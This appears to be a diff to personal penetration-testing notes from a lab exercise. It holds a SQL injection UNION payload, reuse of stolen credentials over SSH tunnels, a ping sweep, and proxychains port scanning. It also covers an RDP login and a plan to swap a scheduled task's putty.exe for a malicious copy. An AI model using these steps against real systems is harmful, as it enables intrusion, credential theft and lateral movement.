@@ -831,6 +831,7 @@ EX UNION SELECT userid,username,name FROM siteusers.users;
 
 SETUP SSH TUNNEL TO THE .171 (TRY CREDS FROM THE .181) 
 - try all the credentials from the WEB SQL injection
+
 DO ENUMERATION ON THE NEWLY ACCESS MACHINE 
 sudo -l
 cat /etc/crontabs (be mindful of the directory if run-parts is in crontab)
@@ -847,10 +848,16 @@ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
 CREATE A TUNNEL TO THE NEWLY FOUND .179( DYNAMIC TUNNEL TO PING SWEEP)
 proxychains nmap -v -sT -Pn -T4 -sV <found IPs> -p1-10000
 FOUND PORTS 3389(RDP), 9999(?)
-xfreerdp /:u
+xfreerdp /:uLroth /v:localhost:<RHP> /dynamic-resolution +glyph-cache +clipboard
 
+ENUMERATE REGESTRIES ON THE MACHINE 
+HKLM RUNONCE/RUN
 
+SEARCH "SERVICES" ON THE WINDOWS SEARCH BAR
+- Check for empty description to see vulnerable exploits
 
-
+CHECK SCHTASKS ON WINDOWS FOR ANY INTERSTING 
+- look for any more suspicious schtasks and check the actions page to see what is happening on the machine (putty)
+- create a new version of C:\users\lroth\temp\putty.exe and name the previous one to putty.old 
 
 
